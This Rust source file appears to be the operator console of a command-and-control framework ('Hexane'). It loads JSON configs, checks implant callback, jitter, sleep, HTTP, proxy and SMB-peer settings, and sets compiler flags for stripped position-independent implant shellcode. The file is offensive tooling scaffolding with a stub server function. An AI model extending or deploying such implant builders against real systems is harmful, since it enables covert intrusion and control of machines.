mod utils;
mod types;
mod error;
mod session;

use std::fs;
use serde_json;
use serde::Deserialize;
use lazy_static::lazy_static;

use rand::Rng;
use std::io::{self, Write};
use core::fmt::Display;
use std::sync::Mutex;
use crate::return_error;
use crate::server::types::NetworkOptions;
use self::error::{Error, Result};
use self::session::{init, USERAGENT, CURDIR};
use self::types::{Hexane, JsonData, Compiler, UserSession};
use self::utils::{cursor, wrap_message, stop_print_channel};

lazy_static!(
    static ref INSTANCES: Mutex<Vec<Hexane>> = Mutex::new(vec![]);
);

pub fn run_client() {
    init();

    loop {
        cursor();

        let mut input = String::new();
        io::stdin().read_line(&mut input).unwrap();

        let input = input.trim();
        if input.is_empty() {
            continue;
        }

        let args: Vec<String> = input.split_whitespace().map(str::to_string).collect();
        match args[0].as_str() {

            "load" => {
                load_instance(args).unwrap_or_else(|e| wrap_message("error", e.to_string()))
            },

            "exit" => break,
            _ => {
                wrap_message("error", format!("invalid input: {}", args[0]));
                continue;
            }
        }
    }

    stop_print_channel();
}

fn load_instance(args: Vec<String>) -> Result<()> {

    if args.len() != 2 {
        wrap_message("error", format!("invalid input: {} arguments", args.len()))
    }
    match map_json_config(&args[1]) {
        Ok(mut instance) => {
            match setup_instance(&mut instance) {
                Ok(setup)   => setup,
                Err(e)      => return Err(e)
            }
            setup_server(&instance);

            let build_dir   = instance.compiler.build_directory.as_str();
            let name        = instance.builder.output_name.as_str();
            let ext         = instance.compiler.file_extension.as_str();

            wrap_message("info", format!("{}/{}.{} is ready", build_dir, name, ext));
            INSTANCES.lock().unwrap().push(instance)
        }
        Err(e)=> {
            return Err(e)
        }
    }

    Ok(())
}

fn setup_instance(instance: &mut Hexane) -> Result<()> {
    if instance.main.debug {
        instance.compiler.compiler_flags = String::from("\
            -std=c++23 \
            -g -Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel \
            -fno-ident -fpack-struct=8 -falign-functions=1 \
            -ffunction-sections -fdata-sections -falign-jumps=1 -w \
            -falign-labels=1 -fPIC -fno-builtin \
            -Wl,--no-seh,--enable-stdcall-fixup,--gc-sections");
    } else {
        instance.compiler.compiler_flags = String::from("\
            -std=c++23 \
            -Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel \
            -fno-ident -fpack-struct=8 -falign-functions=1 \
            -ffunction-sections -fdata-sections -falign-jumps=1 -w \
            -falign-labels=1 -fPIC  -fno-builtin \
            -Wl,-s,--no-seh,--enable-stdcall-fixup,--gc-sections");
    }

    let mut rng = rand::thread_rng();
    instance.peer_id = rng.gen::<u32>();

    match check_instance(instance) {
        Ok(k)   => k,
        Err(e)  => return Err(e)
    }

    Ok(())
}

fn check_instance(instance: &mut Hexane) -> Result<()> {
    if instance.main.hostname.is_empty()                        { return_error!("a valid hostname must be provided") }
    if instance.main.architecture.is_empty()                    { return_error!("a valid architecture must be provided") }
    if instance.main.jitter < 0 || instance.main.jitter > 100   { return_error!("jitter cannot be less than 0% or greater than 100%") }
    if instance.main.sleeptime < 0                              { return_error!("sleeptime cannot be less than zero. wtf are you doing?") }
    if instance.builder.output_name.is_empty()                  { return_error!("a name for the build must be provided") }
    if instance.builder.root_directory.is_empty()               { return_error!("a root directory for implant files must be provided") }

    if let Some(linker_script) = &instance.builder.linker_script {
        if linker_script.is_empty() { return_error!("linker script field found but linker script path must be provided") }
    }

    if let Some(modules) = &instance.builder.loaded_modules {
        if modules.is_empty() { return_error!("loaded module names field found but module names must be provided") }
    }

    if let Some(deps) = &instance.builder.dependencies {
        if deps.is_empty() { return_error!("build dependencies field found but dependencies must be provided") }
    }

    if let Some(inc) = &instance.builder.include_directories {
        if inc.is_empty() { return_error!("include directory field found but include directories must be provided") }
    }

    match &mut instance.network.options {
        NetworkOptions::Http(http) => {

            if http.address.is_empty()              { return_error!("a valid return url must be provided") }
            if http.port < 0 || http.port > 65535   { return_error!("http port must be between 0-65535") }
            if http.endpoints.is_empty()            { return_error!("at least one valid endpoint must be provided") }
            if http.useragent.is_none()             { http.useragent = Some(USERAGENT.to_string()); }

            if let Some(headers) = &http.headers {
                if headers.is_empty() { return_error!("http header field found but names must be provided") }
            }

            if let Some(domain) = &http.domain {
                if domain.is_empty() { return_error!("domain name field found but domain name must be provided") }
            }

            if let Some(proxy) = &http.proxy {
                if proxy.address.is_empty()             { return_error!("proxy field detected but proxy address must be provided") }
                if proxy.port < 0 || proxy.port > 65535 { return_error!("proxy field detected but proxy port must be between 0-65535") }

                if let Some(username) = &proxy.username {
                    if username.is_empty() { return_error!("proxy username field detected but the username was not provided") }
                }

                if let Some(password) = &proxy.password {
                    if password.is_empty() { return_error!("proxy password field detected but the password was not provided") }
                }

                if let Some(proto) = &proxy.proto {
                    if proto.is_empty() { return_error!("proxy protocol must be provided") }
                }
            }
        },
        NetworkOptions::Smb(smb) => {
            if smb.egress_peer.is_empty() { return_error!("an implant type of smb must provide the name of it's parent node") }
        },
        _ => return_error!("valid network config must be provided")
    }
}

fn setup_server(instance: &Hexane) {

}

fn map_json_config(file_path: &String) -> Result<Hexane> {

    let json_file = CURDIR.join("json").join(file_path);
    let contents = fs::read_to_string(json_file).map_err(Error::Io)?;

    let json_data = match serde_json::from_str::<JsonData>(contents.as_str()) {
        Ok(data)    => data,
        Err(e)      => {
            wrap_message("debug", format!("{}", contents));
            return Err(Error::SerdeJson(e))
        }
    };

    let group_id = 0;
    let instance = Hexane {

        current_taskid: 0, peer_id: 0, group_id, build_type: 0, network_type: 0,
        crypt_key: vec![], shellcode: vec![], config_data: vec![],
        active: false,

        compiler: Compiler {
            file_extension:     String::from(""),
            build_directory:    String::from(""),
            compiler_flags:     String::from(""),
        },

        main:       json_data.config,
        network:    json_data.network,
        builder:    json_data.builder,
        loader:     json_data.loader,

        user_session: UserSession {
            username: String::from(""),
            is_admin: false,
        },
    };

    Ok(instance)
}


